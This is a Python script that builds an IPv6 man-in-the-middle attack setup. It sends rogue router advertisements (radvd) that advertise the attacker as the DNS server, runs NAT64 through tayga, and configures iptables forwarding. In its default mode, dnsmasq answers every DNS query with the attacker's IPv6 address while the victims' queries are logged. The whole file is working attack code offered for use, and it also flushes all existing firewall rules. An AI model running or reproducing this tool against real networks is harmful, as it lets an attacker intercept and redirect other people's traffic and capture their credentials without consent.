import subprocess
import os
import sys
import signal
import time
import threading

TAYGA_INTERFACE = "nat64"
DIP6CIDR = "64"
TAYGA4SUBNET = "192.168.255.0/24"
DNSMASQ_SPOOF_CONF = "/etc/dnsmasq.d/spellbinder.conf"
UPSTREAM_DNS = "8.8.8.8"
DNS_LOG_PATH = "/tmp/spellbinder_dns.log"
DNSMASQ_PROCESS = None

def run(cmd, check=True, allow_fail=False):
    print(f"[+] Running: {' '.join(cmd)}")
    result = subprocess.run(cmd, check=False, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    if result.returncode != 0:
        if allow_fail:
            print(f"[!] Warning: command returned non-zero exit ({result.returncode}): {' '.join(cmd)}")
            if result.stderr.strip():
                print(f"[!] STDERR: {result.stderr.strip()}")
        elif check:
            raise subprocess.CalledProcessError(result.returncode, cmd, result.stdout, result.stderr)
    return result

def prevent_service_persistence():
    print("[+] Disabling services to prevent auto-restart on boot...")
    run(["systemctl", "disable", "--now", "radvd"], allow_fail=True)
    run(["systemctl", "disable", "--now", "dnsmasq"], allow_fail=True)
    run(["systemctl", "disable", "--now", "tayga.service"], allow_fail=True)

def prompt_inputs():
    interface = input("Enter the interface to listen on (default eth0): ") or "eth0"
    routable_ip = input("Enter the global IPv6 address to assign (e.g., 2001:db8:1::2): ") or "2001:db8:1::2"
    tayga_ip6 = input("Enter the NAT64 IPv6 address (e.g., 2001:db8:1::3): ") or "2001:db8:1::3"
    tayga_ip4 = input("Enter the NAT64 IPv4 address (e.g., 192.168.255.1): ") or "192.168.255.1"
    dns_mode = int(input("Select DNS mode: [1] Spoof all to attacker IPv6 (default)  [2] Relay to 8.8.8.8: ") or "1")
    return interface, routable_ip, tayga_ip6, tayga_ip4, dns_mode

def sanitize_dnsmasq_conf():
    conf_path = "/etc/dnsmasq.conf"
    if not os.path.exists(conf_path):
        return
    with open(conf_path, "r") as f:
        lines = f.readlines()
    keywords = ["no-resolv", "log-queries", "log-facility", "interface", "bind-interfaces", "address", "server"]
    with open(conf_path, "w") as f:
        for line in lines:
            if any(line.strip().startswith(k) for k in keywords):
                f.write(f"# {line}")
            else:
                f.write(line)
    print("[+] Sanitized /etc/dnsmasq.conf to avoid directive conflicts.")

def load_ipv6_module():
    run(["modprobe", "ipv6"])

def enable_forwarding():
    run(["sysctl", "-w", "net.ipv4.ip_forward=1"])
    run(["sysctl", "-w", "net.ipv6.conf.all.forwarding=1"])

def clear_iptables():
    run(["iptables", "-F"])
    run(["iptables", "-X"])
    run(["ip6tables", "-F"])
    run(["ip6tables", "-X"])

def set_iptables_forwarding(dinterface, dns_mode):
    run(["iptables", "-I", "FORWARD", "-j", "ACCEPT", "-i", TAYGA_INTERFACE, "-o", dinterface])
    run(["iptables", "-I", "FORWARD", "-j", "ACCEPT", "-i", dinterface, "-o", TAYGA_INTERFACE, "-m", "state", "--state", "RELATED,ESTABLISHED"])
    run(["iptables", "-t", "nat", "-I", "POSTROUTING", "-o", dinterface, "-j", "MASQUERADE"])
    run(["ip6tables", "-A", "OUTPUT", "-p", "icmpv6", "--icmpv6-type", "1", "-j", "DROP"])
    if dns_mode == 2:
        run(["iptables", "-A", "OUTPUT", "-p", "udp", "--dport", "53", "-d", UPSTREAM_DNS, "-j", "ACCEPT"], allow_fail=True)

def write_file(path, content):
    with open(path, "w") as f:
        f.write(content)
        print(f"[+] Wrote {path}")

def configure_tayga(tayga_ip4):
    config = f"""tun-device {TAYGA_INTERFACE}
ipv4-addr {tayga_ip4}
prefix  2001:db8:1:FFFF::/96
dynamic-pool {TAYGA4SUBNET}
"""
    write_file("/etc/tayga.conf", config)

def configure_radvd(dinterface, dip6):
    base_prefix = dip6.split("::")[0] + "::"
    config = f"""interface {dinterface}
{{
    AdvSendAdvert on;
    MinRtrAdvInterval 3;
    MaxRtrAdvInterval 10;
    AdvHomeAgentFlag off;
    AdvOtherConfigFlag on;
    prefix {base_prefix}/{DIP6CIDR}
    {{
        AdvOnLink on;
        AdvAutonomous on;
        AdvRouterAddr off;
    }};
    RDNSS {dip6}
    {{
        AdvRDNSSLifetime 30;
    }};
}};
"""
    write_file("/etc/radvd.conf", config)

def configure_dnsmasq(dip6, interface, mode):
    if os.path.exists(DNSMASQ_SPOOF_CONF):
        os.remove(DNSMASQ_SPOOF_CONF)
        print("[*] Removed previous dnsmasq config to avoid conflicts.")
    if mode == 2:
        config = f"""log-queries
log-facility={DNS_LOG_PATH}
bind-interfaces
listen-address=::1
interface={interface}
server={UPSTREAM_DNS}
"""
        print("[*] DNS mode: RELAY via 8.8.8.8")
    else:
        config = f"""no-resolv
log-queries
log-facility={DNS_LOG_PATH}
bind-interfaces
interface={interface}
address=/#/{dip6}
"""
        print("[*] DNS mode: SPOOF all responses to attacker IPv6")
    write_file(DNSMASQ_SPOOF_CONF, config)
    print("[+] Testing dnsmasq config...")
    test_result = subprocess.run(["dnsmasq", "-C", DNSMASQ_SPOOF_CONF, "--test"], capture_output=True, text=True)
    if test_result.returncode != 0:
        print("[-] dnsmasq config test failed:")
        print(test_result.stderr.strip())
        sys.exit(1)
    else:
        print("[+] dnsmasq config test passed.")

def start_dnsmasq():
    global DNSMASQ_PROCESS
    print("[+] Killing any existing dnsmasq services (systemd)...")
    run(["systemctl", "stop", "dnsmasq"], allow_fail=True)
    DNSMASQ_PROCESS = subprocess.Popen(["dnsmasq", "-k", "-C", DNSMASQ_SPOOF_CONF],
                                       stdout=subprocess.DEVNULL,
                                       stderr=subprocess.DEVNULL)
    print(f"[+] dnsmasq started with PID {DNSMASQ_PROCESS.pid}")

def stop_dnsmasq():
    global DNSMASQ_PROCESS
    if DNSMASQ_PROCESS and DNSMASQ_PROCESS.poll() is None:
        DNSMASQ_PROCESS.terminate()
        DNSMASQ_PROCESS.wait()
        print("[+] dnsmasq terminated.")

def log_dns_queries():
    print("[+] Starting DNS query logger...")
    timeout = 5
    waited = 0
    while not os.path.exists(DNS_LOG_PATH):
        time.sleep(0.5)
        waited += 0.5
        if waited >= timeout:
            print("[!] DNS log file not found after waiting.")
            return
    with open(DNS_LOG_PATH, "r") as f:
        f.seek(0, os.SEEK_END)
        while True:
            line = f.readline()
            if not line:
                time.sleep(0.2)
                continue
            if "query" in line:
                print(f"[DNS] {line.strip()}")

def setup_nat64(dinterface, dip6, tayga6ip, tayga_ip4):
    run(["ip", "addr", "add", f"{dip6}/{DIP6CIDR}", "dev", dinterface], check=False)
    run(["ip", "addr", "add", "fe80::1", "dev", dinterface], check=False)
    run(["tayga", "--mktun"], check=False)
    run(["ip", "link", "set", TAYGA_INTERFACE, "up"])
    run(["ip", "addr", "add", tayga6ip, "dev", TAYGA_INTERFACE], check=False)
    run(["ip", "addr", "add", tayga_ip4, "dev", TAYGA_INTERFACE], check=False)
    run(["ip", "route", "add", TAYGA4SUBNET, "dev", TAYGA_INTERFACE], check=False)
    run(["ip", "route", "add", "2001:db8:1:FFFF::/96", "dev", TAYGA_INTERFACE], check=False)
    print("[+] NAT64 setup complete.")

def restart_services():
    run(["systemctl", "restart", "radvd"], allow_fail=True)
    run(["tayga"], allow_fail=True)

def cleanup(signum=None, frame=None):
    print("\n[!] Caught exit signal. Cleaning up...")
    stop_dnsmasq()
    clear_iptables()
    print("[+] Stopping radvd and tayga services...")
    run(["systemctl", "stop", "radvd"], allow_fail=True)
    run(["pkill", "tayga"], allow_fail=True)
    if os.path.exists(DNS_LOG_PATH):
        os.remove(DNS_LOG_PATH)
        print("[+] Removed temp DNS log.")
    print("[+] Cleanup complete. Exiting.")
    sys.exit(0)

def main():
    print("[+] Initializing hardened IPv6 MITM infrastructure")
    prevent_service_persistence()
    dinterface, dip6, tayga6ip, tayga_ip4, dns_mode = prompt_inputs()
    signal.signal(signal.SIGINT, cleanup)
    sanitize_dnsmasq_conf()
    load_ipv6_module()
    enable_forwarding()
    clear_iptables()
    configure_dnsmasq(dip6, dinterface, dns_mode)
    configure_radvd(dinterface, dip6)
    configure_tayga(tayga_ip4)
    setup_nat64(dinterface, dip6, tayga6ip, tayga_ip4)
    set_iptables_forwarding(dinterface, dns_mode)
    restart_services()
    start_dnsmasq()
    threading.Thread(target=log_dns_queries, daemon=True).start()
    print("[+] IPv6 MITM setup complete. Press Ctrl+C to exit and clean up.")
    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
